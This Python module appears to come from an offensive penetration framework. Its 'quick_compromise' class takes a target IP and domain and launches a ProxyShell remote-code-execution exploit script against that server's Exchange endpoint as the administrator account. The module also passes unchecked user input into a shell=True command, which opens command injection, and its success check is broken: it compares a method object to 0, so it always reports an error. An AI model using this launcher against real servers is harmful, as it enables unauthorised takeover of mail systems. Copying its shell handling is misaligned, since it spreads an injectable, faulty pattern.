import subprocess
from core.module_base import ModuleBase
from colorama import Fore, Style, init



init()


class Quick_compromise(ModuleBase):
    def __init__(self):
        super().__init__()
        self.name = "quick_compromise"
        self.options = {
            "ip" : None,
            "domain": None
        }
        self.actions = {
           "proxyshell": self.proxyshell
        }

    def banner(self):
        # This will show a banner with information about the module
        print(Fore.MAGENTA + f"\n🔥 MODULE {self.name.upper()} 🔥 \n" + Style.RESET_ALL)
        print("\n See options and set a target with 'options'")


    def proxyshell(self):
        ip = self.options["ip"]
        domain = self.options["domain"]
        if not all([ip,domain]):
            print("You must set ip and domain for proxyshell")
            return
        
        command = f"python3 utils/common_vuln/proxyshell_rce.py -u https://{ip} -d administrator@{domain}"

        try:
            print(f"Runing Proxyshell exploit on {ip}")
            result = subprocess.run(command, shell=True, check=True, stderr=subprocess.PIPE)

            if result.check_returncode != 0:
                print(f"Error: {result.stderr}")
                return
            else:
                print(f"Success: {result.stdout}")
                return

        except Exception as e:
            print(f"Error: {e}")
            return
            